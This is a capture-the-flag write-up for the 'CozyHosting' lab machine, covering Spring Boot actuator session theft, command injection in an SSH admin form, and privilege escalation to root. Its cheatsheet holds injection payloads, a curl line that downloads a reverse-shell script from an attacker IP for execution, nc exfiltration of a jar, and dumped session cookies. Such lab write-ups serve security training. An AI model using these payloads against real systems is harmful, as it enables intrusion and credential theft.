# CozyHosting \[Easy]

## Report

An HTTP website has an error message which indicates it was deployed under Spring Boot. Upon bruting more info on endpoints using a specific Spring Boot wordlist, we find one 'actuator'. This is basically an API used for debugging and the endpoint 'sessions' reveals the cookie for the user 'kanderson'. This user has access to the admin panel which has two fields 'username' and 'hostname' used to perform an SSH command that is vulnerable to command injection. Get a reverse shell and find a jar file running which contains creds to a PostgreSQL server. Fetch creds for user 'josh'.

Josh can perform ssh as sudo, get root

## Cheatsheet

```
hi;${IFS}id
0xdf;{id};

0xdf;{ping,-c,1,10.10.14.23};#

host=d&username=0xdf;curl${IFS}http://10.10.14.23/rev.sh${IFS}-o${IFS}/tmp/rev.sh
host=d&username=0xdf;bash${IFS}/tmp/rev.sh

0xdf;{bash,/tmp/rev.sh};#

grep -r password . 2>/dev/null
psql -U postgres -h localhost
\list
\dt
\d users [listing schema for table users]
select * from users;

the curly brace expansion didnt work to launch the shell but worked to ping
transfer file and unzip didnt work - had to do it on system : End-of-central-directory signature not found.

nc -nlvp 1234 > cloudhosting-0.0.1.jar
cat cloudhosting-0.0.1.jar | nc 10.10.14.23 1234
```

## Loot

### Creds

```
36A3B91D16974AEFD327507FEAEC57D6	"kanderson"
5A20AB1A2278205C635B18B2CECDED18	"kanderson"
```

### Proof
